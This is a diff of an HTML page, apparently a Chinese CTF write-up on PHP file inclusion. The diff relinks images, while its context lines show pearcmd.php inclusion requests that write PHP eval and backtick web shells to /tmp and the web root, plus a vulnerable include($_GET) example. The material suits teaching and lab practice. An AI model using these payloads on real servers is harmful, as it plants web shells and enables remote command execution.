@@ -128,13 +128,13 @@
 <p><code>username=root man_dir=&lt;?php eval($_POST[1]);?&gt;</code></p>
 <p>ctfshow.php</p>
 <p><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</code></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/818b2e4c435046388400c822e752e025.png" alt="818b2e4c435046388400c822e752e025.png"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/3fa6f5298c8840b3b12d6e8a19a06246.png"></p>
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/818b2e4c435046388400c822e752e025.png"></p>
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png"></p>
 <p>方法三  写配置文件方式，在网站目录下创建1.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/<span class="keyword">var</span>/www/html/<span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span>+<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/d0c3d71471e9456d9025fae518d136aa.png"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/2292b43281fe4354bcf077f563d45400.png"></p>
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png"></p>
+<p><img src="/../images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png"></p>
 <h2 id="三、远程文件包含"><a href="#三、远程文件包含" class="headerlink" title="三、远程文件包含"></a>三、远程文件包含</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$path</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$path</span> . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
